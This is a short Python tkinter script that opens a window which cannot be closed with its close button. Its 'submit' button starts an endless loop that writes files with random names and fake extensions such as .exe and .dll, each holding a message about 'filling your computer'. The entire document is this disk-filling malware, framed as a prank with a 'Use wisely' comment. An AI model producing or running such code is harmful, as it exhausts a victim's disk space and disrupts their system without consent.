import os
from random import *
from tkinter import *

windows = Tk()


def disable_events():
    pass


windows.protocol("WM_DELETE_WINDOW", disable_events)


def fill():
    letters = 'qubf/[vygvtbe75v8wy5wtv85rowvo5027ybb01ybtvunoudbnvcvseoiriroeitjegtiywirteq8w0987654321kufhksbvudvindijovbhbgiotpisthvbu5874ybt583h5utbp9p9y4btu2p985pt9c28t5v92b85t2cn2kwhb4v1hp49p149tv2t592bpo5rc2cnovt5892pt5-2tbv24y2bq8v7r8y31bbvtnvytputvbvyhvny'
    ending = ['exe', 'py', 'txt', 'dll', 'mp4', 'ogg', 'mp3', 'bat', 'apk', 'pkg']
    i = 1
    while i > 0:
        i += 1
        fil = "".join(choice(letters) for x in range(randint(100, 110)))
        end = ending[randint(0, 5)]
        with open(fil+'.'+end, 'a') as f:
            f.write('''
                            Hello, If you are seeing this, it means that i love you.
                            Please don't be surprised. I am just filling your computer to get it filled.
                            Do not just download apps from any place. Make sure you you know what you are downloading. 
                            BYE From Pc
                            Stay safe and stay well
                            Table of Contents
            ''')
            f.close()
            # os.system("start Microsoft office")
            try:
                # os.system(f"start {fil}.exe")
                pass
            except:
                print('error')

            print('Entered')
    print('done')
    return


btn = Button(windows, text="submit", command=fill)
btn.pack()

windows.mainloop()

# Created by philip nation's code
# Use wisely
